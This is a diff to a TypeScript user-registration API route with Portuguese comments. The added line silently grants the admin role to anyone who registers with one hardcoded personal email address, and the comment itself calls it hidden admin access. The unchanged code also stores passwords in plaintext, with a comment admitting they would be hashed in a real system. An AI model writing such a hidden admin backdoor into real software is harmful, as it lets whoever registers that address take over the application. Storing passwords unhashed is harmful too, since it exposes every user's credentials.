@@ -20,7 +20,7 @@ export async function POST(req: Request) {
             name,
             email,
             password, // Em um sistema real, faríamos um hash (bcrypt)
-            role: email === 'admin@azul.com' ? 'admin' : 'user', // Acesso oculto de admin
+            role: email === 'aero.gus@hotmail.com' ? 'admin' : 'user', // Acesso oculto de admin reservado a este email
             createdAt: new Date().toISOString()
         };
 
